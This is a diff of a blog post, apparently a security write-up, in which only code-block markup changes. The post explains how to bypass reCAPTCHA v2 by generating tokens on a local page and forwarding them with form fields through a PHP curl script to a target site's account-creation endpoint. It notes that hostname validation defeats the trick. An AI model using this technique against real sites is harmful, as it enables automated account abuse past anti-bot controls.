@@ -29,7 +29,7 @@ Let's say that you want to bypass the recaptchaV2 for http://www.targetsite.com/
 
 What you can have is an Apache server serving an html file which loads the recaptchaV2 widget with:
 
-<% highlight html %}
+```html
 <html>
   <head>
     <title>reCAPTCHA demo: Simple page</title>
@@ -43,14 +43,14 @@ What you can have is an Apache server serving an html file which loads the recap
     </form>
   </body>
 </html>
-{% endhighlight %}
+```
 
 Then you can have a script.php file set to receive the response as:
 {{{$response = $_POST['g-recaptcha-response']}}}
 
 What it can also do is pass the rest of the parameters to the target URL as:
 
-{% highlight php %}
+```php
 	$url = "https://www.targetsite.com/create_account.action";
 	$response = $_POST['g-recaptcha-response'];
 	$fields = array(
@@ -72,7 +72,7 @@ What it can also do is pass the rest of the parameters to the target URL as:
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
 	$result = curl_exec($ch);
 	curl_close($ch);
-{% endhighlight %}
+```
 
 Bingo! That will submit a valid response to the target site with the rest of the parameters. When the target site sends the response to Google for verification, it'll receive a success of true and a hostname of 'localhost' because that's where the challenge was generated. If the site decides to perform hostname validation, then this attack will not work.
 
